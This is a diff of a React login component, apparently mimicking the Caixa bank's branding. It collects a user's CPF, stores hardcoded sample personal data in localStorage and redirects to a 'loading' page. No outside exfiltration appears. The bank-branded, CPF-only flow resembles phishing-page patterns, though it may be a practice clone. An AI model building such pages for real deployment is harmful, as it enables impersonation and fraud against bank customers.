@@ -1,19 +1,26 @@
 import { useState } from "react";
-import { useNavigate } from "react-router-dom"; // useNavigate é necessário para o redirecionamento
 import logo from "../assets/caixa.webp";
-import user from "../assets/user.png";
+import userIcon from "../assets/user.png";
+
+// Tipagem da resposta simulada
+interface UserData {
+    nome: string;
+    cpf: string;
+    dataNascimento: string;
+}
 
 export function Login() {
-    const [cpf, setCpf] = useState("");
-    const [isLoading, setIsLoading] = useState(false); // Estado para o carregamento
-    const navigate = useNavigate(); // Hook para redirecionar
+    const [cpf, setCpf] = useState<string>("");
+    const [isLoading, setIsLoading] = useState<boolean>(false);
+    const [userData, setUserData] = useState<UserData | null>(null); // Estado para dados do usuário
+    // const navigate = useNavigate();
 
+    console.log(userData)
     // Função para aplicar a máscara de CPF
     const handleCpfChange = (event: React.ChangeEvent<HTMLInputElement>) => {
-        let value = event.target.value.replace(/\D/g, ""); // Remove caracteres não numéricos
-        if (value.length > 11) value = value.slice(0, 11); // Limita o número de dígitos a 11
+        let value = event.target.value.replace(/\D/g, "");
+        if (value.length > 11) value = value.slice(0, 11);
 
-        // Formata o valor no padrão CPF
         value = value.replace(/(\d{3})(\d)/, "$1.$2");
         value = value.replace(/(\d{3})(\d)/, "$1.$2");
         value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
@@ -21,13 +28,44 @@ export function Login() {
         setCpf(value);
     };
 
-    // Função para iniciar o carregamento e redirecionar
+    // Função que chama a API e armazena os dados no localStorage
+    const fetchUserData = async () => {
+        try {
+            setIsLoading(true); // Ativa o estado de carregamento
+
+            // Simulação de chamada para a API
+            // const response = await axios.get<UserData>(`/api/usuarios/${cpf}`);
+            const data = {
+                nome: "Luiz Carlos",
+                cpf: "039472817361",
+                dataNascimento: "30/09/2004"
+            }
+
+            // Armazena os dados no estado e no localStorage
+            setUserData({
+                nome: "Luiz Carlos",
+                cpf: "039472817361",
+                dataNascimento: "30/09/2004"
+            });
+            localStorage.setItem(cpf, JSON.stringify(data));
+
+            // Redireciona após o sucesso
+            window.location.href = "/carregando";
+
+        } catch (error) {
+            console.error("Erro ao buscar dados do usuário:", error);
+        } finally {
+            setIsLoading(false); // Desativa o estado de carregamento
+        }
+    };
+
+    // Função chamada ao clicar no botão "Próximo"
     const handleNext = () => {
-        setIsLoading(true); // Inicia o carregamento
-        setTimeout(() => {
-            setIsLoading(false); // Termina o carregamento após 3 segundos
-            navigate("/carregando"); // Redireciona para a nova página
-        }, 3000); // Define o tempo de carregamento
+        if (cpf.length < 14) {
+            alert("Por favor, insira um CPF válido.");
+            return;
+        }
+        fetchUserData(); // Chama a API ao clicar no botão
     };
 
     return (
@@ -38,18 +76,20 @@ export function Login() {
             </header>
 
             <div>
-                <h1 className="text-lg text-zinc-500">Informe seu CPF e clique em "Próximo" para continuar:</h1>
+                <h1 className="text-lg text-zinc-500">
+                    Informe seu CPF e clique em "Próximo" para continuar:
+                </h1>
             </div>
 
             <div className="flex items-center space-x-2">
-                <img src={user} alt="user" width={15} />
+                <img src={userIcon} alt="user" width={15} />
                 <input
                     type="text"
                     value={cpf}
                     onChange={handleCpfChange}
                     className="border-b border-b-orange-500 w-full text-lg outline-none"
                     placeholder="CPF"
-                    maxLength={14} // Limita o número de caracteres
+                    maxLength={14}
                 />
             </div>
 
@@ -57,10 +97,10 @@ export function Login() {
                 onClick={handleNext}
                 className={`w-full text-white rounded-sm flex items-center justify-center h-10 ${isLoading ? "bg-orange-500 cursor-not-allowed" : "bg-orange-400"
                     }`}
-                disabled={isLoading} // Desativa o botão durante o carregamento
+                disabled={isLoading}
             >
                 {isLoading ? (
-                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div> // Spinner
+                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-white"></div>
                 ) : (
                     "Próximo"
                 )}
